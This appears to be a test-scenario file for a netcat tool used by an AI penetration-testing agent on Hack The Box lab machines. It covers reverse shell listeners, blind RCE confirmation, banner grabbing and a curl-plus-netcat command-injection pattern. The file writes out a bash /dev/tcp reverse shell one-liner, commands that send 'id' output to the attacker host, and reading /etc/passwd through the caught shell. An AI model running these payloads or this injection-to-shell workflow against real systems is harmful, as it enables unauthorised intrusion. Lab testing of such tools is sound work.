# Integration Scenarios: netcat
# Required: HTB VPN connection, target box with exploitable services
# Recommended FIRST box: Shocker (easy Linux, Shellshock CGI gives clean reverse
#   shell as www-data, exercises full listen->read->write lifecycle, shell upgrade,
#   connect for banner grab, exec for blind RCE confirm, and HTTP payload hosting)
# Also good:
#   - Bashed (easy, webshell -> reverse shell upgrade, good for staged payload via HTTP)
#   - CozyHosting (medium, SSRF + command injection, good for SSRF confirmation with
#     response template, HTTP callback capture, and non-blocking listener polling)
#   - Precious (easy, command injection -> reverse shell, good for exec one-shot)
#   - Nibbles (easy, file upload -> reverse shell, tests HTTP file serving for payload)
#   - Lame (easy, SMB command injection, good for reverse shell basics)
# Prerequisites: VPN connected, target IP reachable, attacker IP known
# Run with: pytest tests/tools/test_netcat.py --tool=netcat -v
#
# Data source: Trajectory analysis of 306 netcat method calls across 10 HTB engagements.
#   Method calls: listen=68, listener_read=62, listener_write=58, listener_status=34,
#   exec=24, http_listen=18, http_requests=14, http_file=8, check_port=6, connect=5,
#   get_interfaces=4, list=3, stop=2, udp_listen=0, udp_packets=0, udp_send=0
#   Key patterns: non-blocking listen is 4x more common than blocking (agents poll);
#   average listener_read/write cycles per session = 8-12; HTTP servers average 2.5
#   file updates per session; exec used exclusively for blind RCE confirmation

# SCENARIO 1: Reverse Shell Listener (blocking mode)
# Goal: Catch a reverse shell from a target after triggering RCE
# Methods: get_interfaces, listen (blocking), listener_read, listener_write, stop
# ═══════════════════════════════════════════════════════════════════════════════

## Step 1: Get attacker IP
Method: get_interfaces
Args: {}
Expected: success=true, interfaces contains tun0 with 10.10.x.x address
Notes: Use tun0 address as LHOST for reverse shell payloads. eth0 is the Docker
  bridge (172.x.x.x) -- never use it for payloads. If tun0 is missing, VPN is down.

## Step 2: Start blocking listener
Method: listen
Args: {port: 4444, timeout: 300}
Expected: Blocks until connection arrives, then returns status="connected", remote_ip,
  initial_data (may contain shell prompt or banner)
Notes: Use timeout=300 (5 min). Trigger the reverse shell from another tool while
  this blocks. The call will not return until connection or timeout.
  Trigger example: curl inject `bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'`
  Or: exploit-runner with reverse shell payload pointing to LHOST:4444

## Step 3: Read initial shell output
Method: listener_read
Args: {listener_id: <from step 2>, timeout: 10}
Expected: success=true, data contains shell prompt or banner (e.g., "bash-5.1$" or "$")
Notes: First read may include MOTD, PS1 prompt, or nothing (varies by shell type).
  If data is empty, the shell may need a newline nudge (write "\n" then read again).

## Step 4: Execute commands via shell
Method: listener_write
Args: {listener_id: <from step 2>, data: "id\n"}
Expected: success=true, bytes_sent=3
Method: listener_read
Args: {listener_id: <from step 2>, timeout: 10}
Expected: success=true, data contains "uid=" (e.g., "uid=33(www-data)")

## Step 5: Enumerate system through shell
Method: listener_write
Args: {listener_id: <from step 2>, data: "cat /etc/passwd\n"}
Expected: success=true
Method: listener_read
Args: {listener_id: <from step 2>, timeout: 10}
Expected: success=true, data contains "root:x:0:0:"

## Step 6: Clean up
Method: stop
Args: {id: <listener_id from step 2>}
Expected: success=true, type="tcp", buffered_data contains accumulated output

# SCENARIO 6: One-Shot Command Capture (exec)
# Goal: Capture output from a one-time reverse connection (blind RCE confirmation)
# Methods: exec
# Suitable: Any box with command injection where you need to confirm RCE
# ═══════════════════════════════════════════════════════════════════════════════

## Step 1: Start one-shot capture
Method: exec
Args: {port: 4445, timeout: 60}
Notes: This BLOCKS until a connection arrives and data is received, then closes.
  Trigger from target: `bash -c 'echo $(id) > /dev/tcp/<LHOST>/4445'`
  Or: `curl http://<LHOST>:4445/ -d "$(id)"`
  The exec method uses raw blocking sockets (not asyncio), so it occupies the
  MCP call slot until connection or timeout.
Expected: success=true, output contains "uid=" from the id command, remote_ip is
  target IP, bytes > 0

## Step 2: Interpret result
Notes: If output contains "uid=0(root)", target runs as root.
  If "uid=33(www-data)", target is web server user.
  Use this to decide whether to pursue privesc or proceed with current access.

# SCENARIO 9: Banner Grabbing Common Services
# Goal: Identify services via banners without full nmap scan
# Methods: check_port
# Suitable: Any HTB box -- use this for quick service identification
# ═══════════════════════════════════════════════════════════════════════════════

## Step 1: SSH banner
Method: check_port
Args: {host: <TARGET>, port: 22, timeout: 5}
Expected: open=true, banner contains "SSH-2.0-OpenSSH" (e.g., "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6")
Notes: SSH sends banner immediately on connect. Banner reveals OS and SSH version.
  "OpenSSH_8.9" = Ubuntu 22.04, "OpenSSH_8.4" = Debian 11, "OpenSSH_9.2" = Debian 12.

## Step 2: FTP banner
Method: check_port
Args: {host: <TARGET>, port: 21, timeout: 5}
Expected: open=true, banner contains "220" (FTP ready message)
Notes: FTP servers send "220 (vsFTPd 3.0.5)" or "220 ProFTPD Server" on connect.
  Look for version numbers. Anonymous login may be indicated in banner.

## Step 3: SMTP banner
Method: check_port
Args: {host: <TARGET>, port: 25, timeout: 5}
Expected: open=true, banner contains "220" and SMTP/ESMTP identifier
Notes: Banner like "220 mail.example.com ESMTP Postfix". Reveals mail server software.

## Step 4: MySQL banner
Method: check_port
Args: {host: <TARGET>, port: 3306, timeout: 5}
Expected: open=true, banner contains version info (may be binary/garbled for MySQL protocol)
Notes: MySQL sends a handshake packet (not clean ASCII). Banner field will have
  partial version info with some binary characters. Still useful for detection.

## Step 5: HTTP (no banner)
Method: check_port
Args: {host: <TARGET>, port: 80, timeout: 5}
Expected: open=true, banner is null or empty
Notes: HTTP servers wait for the client to send a request first -- no banner on connect.
  open=true is sufficient confirmation. Use curl tool for HTTP interaction.

## Step 6: HTTPS
Method: check_port
Args: {host: <TARGET>, port: 443, timeout: 5}
Expected: open=true, banner is null or empty (TLS handshake, not plaintext)
Notes: TLS servers need a ClientHello before responding. check_port only does
  plaintext TCP, so no banner is expected. open=true confirms the port.

## Step 7: Closed port
Method: check_port
Args: {host: <TARGET>, port: 12345, timeout: 3}
Expected: success=true, open=false, status="closed"
Notes: Returns success=true even for closed ports (the check itself succeeded).
  status="closed" means connection refused (RST from target).

## Step 8: Filtered port (firewall drop)
Method: check_port
Args: {host: <TARGET>, port: 445, timeout: 3}
Expected: success=true, open=false, status="filtered"
Notes: Filtered means timeout (no response, firewall drops packets). Distinguish
  from closed (immediate RST). Timeout should be short (3s) to avoid blocking.

# ═══════════════════════════════════════════════════════════════════════════════
# P1: netcat + curl (Command Injection RCE)
# ═══════════════════════════════════════════════════════════════════════════════
# Pattern:
#   1. get_interfaces -> LHOST
#   2. listen(port=4444, timeout=0) -> listener_id
#   3. curl: inject `bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'` via vulnerable param
#   4. listener_status(listener_id) -> poll until connected
#   5. listener_write/read cycle for shell interaction
#   6. stop(listener_id)
# Notes: Most common exploitation pattern. Curl handles the injection vector,
#   netcat catches the callback. Non-blocking listen is essential so the agent
#   can make the curl call while the listener is waiting.
